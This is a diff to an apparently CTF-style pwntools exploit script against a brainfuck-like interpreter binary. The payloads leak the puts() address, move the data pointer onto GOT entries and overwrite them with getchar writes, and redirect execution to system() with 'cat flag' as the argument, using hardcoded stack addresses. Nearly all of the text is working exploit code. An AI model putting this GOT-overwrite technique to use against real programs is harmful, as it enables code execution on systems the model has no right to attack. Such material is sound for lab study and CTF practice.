@@ -60,8 +60,7 @@ payload += b"<<<" # leak the address of puts
 payload += b">" * 24 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b",>,>,>," # getchar - for getting the last char
 payload += b"." # trigger char
-payload += b"AAAABBBB" # payload
-#payload += b"[" # call to puts()
+payload += b"cat flag" # payload - address is 0xffffcc6e but maybe changes
 payload += b"\n" # call to puts()
 conn.send(payload)
 
@@ -107,7 +106,10 @@ memset_addr_in_main = 0x8048700
 payload = p32(memset_addr_in_main)
 payload +=b"aaaabaaacaaa"
 payload += p32(system_addr)
-payload +=b"eaaafaaagcat flagaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"# decrease from putchar() GOT to puts() GOT address
+arg_addr = 0xffffcc6e# TODO - NOTICE THAT IT MIGHT CHANGE IN REAL BINARY (?)
+# fallback is putting it in heap in fgets input
+payload +=p32(0xffffcba1) 
+payload +=b"faaagcat flagaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"# decrease from putchar() GOT to puts() GOT address
 payload += b"<"  * 27# decrease from putchar() GOT to puts() GOT address
 payload += b",>,>,>," # Setting the puts() GOT address
 payload += b"[" # Calling the puts() 
